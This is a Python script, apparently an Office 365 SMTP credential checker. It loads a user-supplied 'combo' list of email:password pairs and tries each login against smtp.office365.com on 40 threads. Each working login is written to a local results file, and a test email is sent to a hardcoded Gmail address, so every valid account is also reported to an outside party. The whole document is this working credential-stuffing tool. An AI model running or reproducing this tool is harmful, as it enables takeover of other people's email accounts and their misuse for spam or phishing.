import smtplib
import os
from contextlib import suppress
from email.mime.text import MIMEText
import concurrent.futures
from time import perf_counter

if not os.path.isdir("office365-SMTP-Results"):
    os.mkdir("office365-SMTP-Results")
else:
    pass
resultx = open("office365-SMTP-Results/Office365.txt", 'a')
msg = MIMEText('Checker Test email BY -_-')


def smtp_test(name):
    with suppress(smtplib.SMTPAuthenticationError, smtplib.SMTPDataError, smtplib.SMTPConnectError):
        name1 = name.split(':')
        user = name1[0]
        passw = name1[1]
        port = 587
        host = "smtp.office365.com"
        mtps = smtplib.SMTP(host, port)
        mtps.ehlo()
        mtps.starttls()
        mtps.login(user, passw)
        msg['Subject'] = 'Send working'
        mtps.sendmail(user, 'mokyyoser@gmail.com', msg.as_string())
        result = resultx.write(f"{host}|{port}|{user}|{passw}")
        mtps.quit()


combo = str(input("Enter your combo: "))
f1 = open(combo, 'r')
start_time = perf_counter()
with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
    executor.map(smtp_test, f1)
end_time = perf_counter()
print(f'It took {end_time - start_time: 0.2f} seconds to complete.')
